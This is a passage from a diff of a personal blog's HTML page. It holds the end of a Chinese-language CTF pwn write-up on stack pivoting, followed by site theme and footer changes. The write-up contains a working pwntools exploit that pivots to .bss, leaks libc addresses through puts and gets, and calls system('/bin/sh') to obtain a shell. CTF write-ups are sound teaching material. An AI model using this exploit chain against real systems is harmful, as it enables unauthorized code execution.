class="line">payload = flat([&#x27;&#x27;.ljust(offset, &#x27;\x90&#x27;), bss1, pop_rdi_ret, bss1, gets_plt, leave_ret])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">time.sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload = flat([bss1, pop_rdi_ret, puts_got, puts_plt, pop_rdi_ret, gets_got, puts_plt, pop_rdi_ret, bss1, gets_plt, leave_ret ])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">raw_data = io.recv()</span><br><span class="line"></span><br><span class="line">puts = u64(raw_data[:6].ljust(8, &quot;\x00&quot;))</span><br><span class="line">gets = u64(raw_data[7:13].ljust(8, &#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">log.info(&quot;puts is 0x%x&quot; %puts)</span><br><span class="line">log.info(&quot;gets is 0x%x&quot; %gets)</span><br><span class="line"></span><br><span class="line">system = puts - libc.symbols[&#x27;puts&#x27;] + libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh = puts - libc.symbols[&#x27;puts&#x27;] + libc.search(&quot;/bin/sh&quot;).next()</span><br><span class="line">time.sleep(0.1)</span><br><span class="line">payload = p64(bss1) + p64(pop_rdi_ret) + p64(binsh) + p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>大概提一下幾個需要注意的地方：</p>
 <p>因為 <code>gets</code> x64 的 argv 是放在 <code>rdi</code> 裡面，所以不用特別 <code>pop</code> stack 內的值<br>也因為需要先 <code>pop_rdi</code> 才能 call function, 所以 paylaod 放的順序也要稍微注意一下</p>
 <p>再來因為我們改成用 <code>gets</code> 當作輸入，所以就不能用 <code>send</code> 而要用 <code>sendline</code> 了</p>
 <p>最後一個就是 libc address 的長度要記得用 <code>ljust</code> 補滿0, 這樣 <code>u64</code> 才會正常</p>
 
+        </div>
 
+        
+            <section class="post-copyright">
                 
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>AStar</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://sda06407.github.io/2019/06/30/stack-pivot/">https://sda06407.github.io/2019/06/30/stack-pivot/</a></span>
+                    </p>
+                
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>stay hungry stay foolish</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/PWN/"># PWN</a>
+                    
+                        
+                </span>
             </div>
-
-            <!-- Comments -->
-            
-                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                    
-
-
-                </div>
-            
-        </div>
-    </div>
-</article>
-
-    <!-- Footer -->
-    <hr />
-
-<!-- Footer -->
-<footer>
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <ul class="list-inline text-center">
-                    
-
-                    
-
-                    
-                        <li>
-                            <a href="https://github.com/sda06407" target="_blank">
-                                <span class="fa-stack fa-lg">
-                                    <i class="fa fa-circle fa-stack-2x"></i>
-                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-                                </span>
-                            </a>
-                        </li>
-                    
-
-                    
-
-                    
-
-                    
-                </ul>
-                <p class="copyright text-muted">&copy; 2021 AStar<br></p>
-                <p class="copyright text-muted">Original Theme <a target="_blank" href="http://startbootstrap.com/template-overviews/clean-blog/">Clean Blog</a> from <a href="http://startbootstrap.com/" target="_blank">Start Bootstrap</a></p>
-                <p class="copyright text-muted">Adapted for <a target="_blank" href="https://hexo.io/">Hexo</a> by <a href="http://www.codeblocq.com/" target="_blank">Jonathan Klughertz</a></p>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
             </div>
-        </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/09/02/TWCTF-2019/">TWCTF-2019</a>
+            
+            
+            <a class="next" rel="next" href="/2019/06/22/HITCON-Training-2017/">HITCON_Training_2017</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© AStar | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
 </footer>
 
-
-    <!-- After footer scripts -->
-    
-<!-- jQuery -->
-<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
-
-<!-- Bootstrap -->
-<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
-
-<!-- Gallery -->
-<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
-
-<!-- Disqus Comments -->
-
-
-
+    </div>
 </body>
 
 </html>
